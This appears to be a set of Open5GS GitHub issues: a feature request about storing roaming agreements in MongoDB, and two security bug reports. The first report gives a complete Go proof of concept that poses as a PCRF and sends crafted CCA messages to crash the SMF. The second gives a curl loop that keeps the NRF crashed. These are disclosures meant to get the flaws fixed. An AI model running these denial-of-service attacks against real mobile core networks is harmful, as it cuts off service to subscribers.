I was trying to understand why the Open5GS roaming agreement is being placed in the PCF configuration file in the `policy` section instead of having a different collection in the MongoDB database. If we use the Open5GS database, the roaming agreements could be changed without the need of changing the PCF configuration file and restarting it.

The PCF has already a connection to the Open5GS database, it would be a matter of creating a `roaming` collection and store the same fields that we are defining in the `policy` section of the PCF configuration file.

This will let us get closer to a more dynamic roaming agreements.

Thanks.

items.title: [Bug]: SMF crashes when receiving CCA with unknown Session-Id

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6

### Description
`smf_gx_cca_cb()`, `smf_gy_cca_cb()`, and `smf_s6b` CCA callbacks use
`ogs_assert(new == 0)` after `fd_msg_sess_get()` to verify the session
already exists. If a malicious Diameter peer replies with a CCA containing
an unknown or mismatched `Session-Id`, `fd_msg_sess_get()` returns `new=1`
(new session), triggering `ogs_assert()` → `ogs_abort()` → **SMF process crash**.

A single malformed CCA message is sufficient to crash the SMF, denying
service to all UE sessions.

### Steps to reproduce


1. Start the DoS PoC

```bash
go mod tidy
go run . \
  -listen 10.44.44.9:3868 \
  -cer-host pcrf.localdomain \
  -cer-realm localdomain \
  -mode bogus-session
```
PoC
```go
package main

import (
	"flag"
	"fmt"
	"log"
	"time"

	"github.com/fiorix/go-diameter/v4/diam"
	"github.com/fiorix/go-diameter/v4/diam/avp"
	"github.com/fiorix/go-diameter/v4/diam/datatype"
	"github.com/fiorix/go-diameter/v4/diam/dict"
	"github.com/fiorix/go-diameter/v4/diam/sm"
)

// Gx Application ID (3GPP TS 29.212)
const gxApplicationID uint32 = 16777238

// Gy Application ID (DCCA, RFC 4006)
const gyApplicationID uint32 = 4

// 3GPP Vendor ID
const vendor3GPP uint32 = 10415

var (
	flagListen   = flag.String("listen", "127.0.0.9:3868", "Listen address (replace legitimate PCRF/OCS)")
	flagCERHost  = flag.String("cer-host", "pcrf.localdomain", "Origin-Host for CER/CEA handshake (must match ConnectPeer)")
	flagCERRealm = flag.String("cer-realm", "localdomain", "Origin-Realm for CER/CEA handshake")
	flagMode     = flag.String("mode", "bogus-session", "DoS mode: bogus-session | cross-app")
)

func main() {
	flag.Parse()
	log.SetFlags(log.Ltime | log.Lmicroseconds)

	log.Println("========================================")
	log.Println("  PoC: SMF CCA Session Assertion DoS")
	log.Println("  Vulnerability: ogs_assert(new == 0)")
	log.Println("  Affected files:")
	log.Println("    - src/smf/gx-path.c:779")
	log.Println("    - src/smf/gy-path.c:1009")
	log.Println("    - src/smf/s6b-path.c:390, 733")
	log.Println("========================================")
	log.Printf("[*] Listen address  : %s", *flagListen)
	log.Printf("[*] CER/CEA Identity: %s / %s", *flagCERHost, *flagCERRealm)
	log.Printf("[*] DoS mode        : %s", *flagMode)

	settings := &sm.Settings{
		OriginHost:       datatype.DiameterIdentity(*flagCERHost),
		OriginRealm:      datatype.DiameterIdentity(*flagCERRealm),
		VendorID:         datatype.Unsigned32(vendor3GPP),
		ProductName:      datatype.UTF8String("dos-poc"),
		OriginStateID:    datatype.Unsigned32(uint32(time.Now().Unix())),
		FirmwareRevision: datatype.Unsigned32(1),
	}

	mux := sm.New(settings)
	mux.HandleFunc("CCR", handleCCR)
	mux.HandleFunc("ALL", func(c diam.Conn, m *diam.Message) {
		if m.Header.CommandCode != diam.CreditControl {
			log.Printf("[~] Received %s (cmd=%d) from %s — ignoring",
				cmdName(m), m.Header.CommandCode, c.RemoteAddr())
		}
	})

	log.Printf("[*] Waiting for SMF to connect on %s ...", *flagListen)
	if err := diam.ListenAndServe(*flagListen, mux, dict.Default); err != nil {
		log.Fatalf("[-] ListenAndServe failed: %v", err)
	}
}

func handleCCR(c diam.Conn, m *diam.Message) {
	appID := m.Header.ApplicationID
	sessionID := extractUTF8(m, avp.SessionID, 0)
	ccRequestType := extractUint32(m, avp.CCRequestType, 0)
	ccRequestNumber := extractUint32(m, avp.CCRequestNumber, 0)

	log.Println()
	log.Println("[+] ============================================")
	log.Printf("[+] CCR received from SMF (%s)", c.RemoteAddr())
	log.Printf("[+] ApplicationId   : %d (%s)", appID, appName(appID))
	log.Printf("[+] Session-Id      : %s", sessionID)
	log.Printf("[+] CC-Request-Type : %d (%s)", ccRequestType, ccRequestTypeName(ccRequestType))

	mode := *flagMode
	switch mode {
	case "bogus-session":
		// Send CCA with a fabricated Session-Id that doesn't match any
		// existing session in the SMF. This causes fd_msg_sess_get() to
		// return new=1, triggering ogs_assert(new == 0) → abort().
		sendBogusSessionCCA(c, m, appID, ccRequestType, ccRequestNumber)

	case "cross-app":
		// Send CCA with Gx ApplicationId in response to a Gy CCR (or vice versa).
		// The session lookup in the wrong application's callback fails
		// with new=1, triggering the same assertion.
		sendCrossAppCCA(c, m, appID, sessionID, ccRequestType, ccRequestNumber)

	default:
		log.Fatalf("[-] Unknown mode: %s", mode)
	}
}

// sendBogusSessionCCA replies with a CCA containing a fabricated Session-Id.
// The SMF's fd_msg_sess_get() will not find this session, returning new=1.
// gx-path.c:779 / gy-path.c:1009: ogs_assert(new == 0) → abort()
func sendBogusSessionCCA(c diam.Conn, m *diam.Message, appID, ccRequestType, ccRequestNumber uint32) {
	bogusSessionID := fmt.Sprintf("bogus.attacker.com;%d;999;app_dos", time.Now().Unix())

	cca := m.Answer(2001)

	// Insert fabricated Session-Id as first AVP
	cca.InsertAVP(diam.NewAVP(avp.SessionID, avp.Mbit, 0,
		datatype.UTF8String(bogusSessionID)))

	cca.NewAVP(avp.OriginHost, avp.Mbit, 0,
		datatype.DiameterIdentity(*flagCERHost))
	cca.NewAVP(avp.OriginRealm, avp.Mbit, 0,
		datatype.DiameterIdentity(*flagCERRealm))
	cca.NewAVP(avp.AuthApplicationID, avp.Mbit, 0,
		datatype.Unsigned32(appID))
	cca.NewAVP(avp.CCRequestType, avp.Mbit, 0,
		datatype.Enumerated(ccRequestType))
	cca.NewAVP(avp.CCRequestNumber, avp.Mbit, 0,
		datatype.Unsigned32(ccRequestNumber))

	if _, err := cca.WriteTo(c); err != nil {
		log.Printf("[-] Failed to send CCA: %v", err)
		return
	}

	log.Println("[!] ----- DoS CCA SENT (bogus-session) -----")
	log.Printf("[!] Bogus Session-Id: %s", bogusSessionID)
	log.Println("[!] SMF will call fd_msg_sess_get() → new=1")
	log.Println("[!] ogs_assert(new == 0) → ogs_abort() → SMF CRASH")
	log.Println("[+] ============================================")
}

// sendCrossAppCCA replies to all CCRs with the same CCA (including Gx AVPs).
// When a Gy CCR gets a Gx-style CCA, the Gy callback's session lookup
// fails because the Session-Id belongs to a different application context.
func sendCrossAppCCA(c diam.Conn, m *diam.Message, appID uint32, sessionID string, ccRequestType, ccRequestNumber uint32) {
	// Always respond with Gx ApplicationId, regardless of what was requested
	cca := m.Answer(2001)

	cca.InsertAVP(diam.NewAVP(avp.SessionID, avp.Mbit, 0,
		datatype.UTF8String(sessionID)))

	cca.NewAVP(avp.OriginHost, avp.Mbit, 0,
		datatype.DiameterIdentity(*flagCERHost))
	cca.NewAVP(avp.OriginRealm, avp.Mbit, 0,
		datatype.DiameterIdentity(*flagCERRealm))
	// Force Gx ApplicationId regardless of original request
	cca.NewAVP(avp.AuthApplicationID, avp.Mbit, 0,
		datatype.Unsigned32(gxApplicationID))
	cca.NewAVP(avp.CCRequestType, avp.Mbit, 0,
		datatype.Enumerated(ccRequestType))
	cca.NewAVP(avp.CCRequestNumber, avp.Mbit, 0,
		datatype.Unsigned32(ccRequestNumber))

	if _, err := cca.WriteTo(c); err != nil {
		log.Printf("[-] Failed to send CCA: %v", err)
		return
	}

	log.Println("[!] ----- DoS CCA SENT (cross-app) -----")
	log.Printf("[!] Original CCR AppId: %d (%s)", appID, appName(appID))
	log.Printf("[!] CCA AppId forced : %d (Gx)", gxApplicationID)
	log.Println("[!] Session mismatch in callback → ogs_assert(new==0) → SMF CRASH")
	log.Println("[+] ============================================")
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

func extractUTF8(m *diam.Message, code uint32, vendorID uint32) string {
	a, err := m.FindAVP(code, vendorID)
	if err != nil || a == nil {
		return "(not found)"
	}
	return string(a.Data.Serialize())
}

func extractUint32(m *diam.Message, code uint32, vendorID uint32) uint32 {
	a, err := m.FindAVP(code, vendorID)
	if err != nil || a == nil {
		return 0
	}
	switch v := a.Data.(type) {
	case datatype.Unsigned32:
		return uint32(v)
	case datatype.Enumerated:
		return uint32(v)
	case datatype.Integer32:
		return uint32(v)
	default:
		return 0
	}
}

func appName(id uint32) string {
	switch id {
	case gxApplicationID:
		return "Gx"
	case gyApplicationID:
		return "Gy"
	default:
		return "unknown"
	}
}

func ccRequestTypeName(t uint32) string {
	switch t {
	case 1:
		return "INITIAL_REQUEST"
	case 2:
		return "UPDATE_REQUEST"
	case 3:
		return "TERMINATION_REQUEST"
	case 4:
		return "EVENT_REQUEST"
	default:
		return "UNKNOWN"
	}
}

func cmdName(m *diam.Message) string {
	if m.Header.CommandFlags&diam.RequestFlag != 0 {
		return "Request"
	}
	return "Answer"
}
```
The PoC impersonates `pcrf.localdomain` for the CER/CEA handshake,
then replies to every CCR with a CCA containing a fabricated Session-Id
(`bogus.attacker.com;...;app_dos`).

2.  trigger UE attach
 Start eNB + UE to trigger attach 


3. SMF crashes immediately

The SMF process terminates upon receiving the malicious CCA.

### Root Cause

```c
// gx-path.c:777-779 (same pattern in gy-path.c:1007-1009 and s6b-path.c)
ret = fd_msg_sess_get(fd_g_config->cnf_dict, *msg, &session, &new);
ogs_assert(ret == 0);
ogs_assert(new == 0);  // <-- crash if session not found
```

`ogs_assert()` is defined as:
```c
// lib/core/ogs-log.h:112-119
#define ogs_assert(expr) \
    do { \
        if (ogs_likely(expr)) ; \
        else { \
            ogs_fatal("%s: Assertion `%s' failed.", OGS_FUNC, #expr); \
            ogs_abort(); \
        } \
    } while(0)
```

When `new != 0` (session not found), `ogs_abort()` calls `abort()`,
killing the SMF process immediately. This should be a graceful error
(log + discard message), not a hard crash.

### Logs

```shell
03/04 04:01:31.837: [diam] ERROR:      'Credit-Control-Answer'
        Version: 0x01
        Length: 164
        Flags: 0x40 (-P--)
        Command Code: 272
        ApplicationId: 4
         AVP: 'Session-Id'(263) l=49 f=-M val="bogus.attacker.com;1772596891;999;app_dos"
         AVP: 'Result-Code'(268) l=12 f=-M val='DIAMETER_SUCCESS' (2001 (0x7d1))
         AVP: 'Origin-Host'(264) l=24 f=-M val="pcrf.localdomain"
         AVP: 'Origin-Realm'(296) l=19 f=-M val="localdomain"
         AVP: 'Auth-Application-Id'(258) l=12 f=-M val=4 (0x4)
         AVP: 'CC-Request-Type'(416) l=12 f=-M val='INITIAL_REQUEST' (1 (0x1))
         AVP: 'CC-Request-Number'(415) l=12 f=-M val=0 (0x0)

03/04 04:01:31.837: [core] FATAL: backtrace() returned 7 addresses (../lib/core/ogs-abort.c:37)
    open5gs-smfd(+0x573a1)
    /usr/local/lib/libfdcore.so.7(+0x6d2e7)
    /usr/local/lib/libfdcore.so.7(+0x7251c)
    /usr/local/lib/libfdcore.so.7(+0x727a5)
    /lib/x86_64-linux-gnu/libc.so.6(+0x94ac3)
    /lib/x86_64-linux-gnu/libc.so.6(clone+0x44)
```

### Expected behaviour

When the SMF receives a CCA whose `Session-Id` does not match any active
Diameter session (i.e. `fd_msg_sess_get()` returns `new=1`), the SMF should:

1. Log a warning/error identifying the unknown session.
2. Discard the malformed message and free associated resources.
3. Continue running normally, unaffected — all other UE sessions remain active.

A rogue or misconfigured Diameter peer must **not** be able to crash the SMF
through a single unexpected reply.

### Observed Behaviour

When a CCA with a fabricated or mismatched `Session-Id` is received:

1. `fd_msg_sess_get()` returns `new=1` (session not found in local table).
2. `ogs_assert(new == 0)` immediately fails.
3. `ogs_fatal()` logs `"Assertion 'new == 0' failed."` and calls `ogs_abort()`.
4. The **entire SMF process is killed** via `abort()`.
5. All active UE PDN/PDU sessions are instantly torn down; the network is
   unavailable until SMF restarts — and the crash repeats on every new attach
   if the malicious peer remains connected.

### eNodeB/gNodeB

srsenb

### UE Models and versions

srsue

items.title: [NRF] DoS after sending a requester-nf-type that is not allowed
items.body:
### Open5GS Release, Revision, or Tag

v2.7.0

### Steps to reproduce

Open5GS installed on Kubernetes with Helm.

Use an nf-type that is not allowed in the NFProfile of AMF :
`target-nf-type=AMF`
`requester-nf-type=AMF`

Use an infinite loop with curl to maintain the state of the NRF (because it restarts after a CrashLoopBackOff).

```bash
while true
do
curl --http2-prior-knowledge -k -X GET 'https://10.102.22.146/nnrf-disc/v1/nf-instances?target-nf-type=AMF&requester-nf-type=AMF' -H 'accept: application/json' -H 'Content-Type: application/json'
done
```


### Logs

```shell
6/12 11:09:52.517: [sbi] ERROR: Not allowed nf-type[AMF] in nf-instance[AMF] (../lib/sbi/context.c:1161)
/[entrypoint.sh](http://entrypoint.sh/): line 43:     8 Segmentation fault      (core dumped) $@
```

### Expected behaviour

NRF pod should remain up and send HTTP response with status code "401 Unauthorized" or "400 Bad Request".

### Observed Behaviour


The NRF becomes unavailable when it receives a large number of requests with a requester-nf-type that is not allowed in the NFProfile of an NF producer and rejects new HTTP connections.
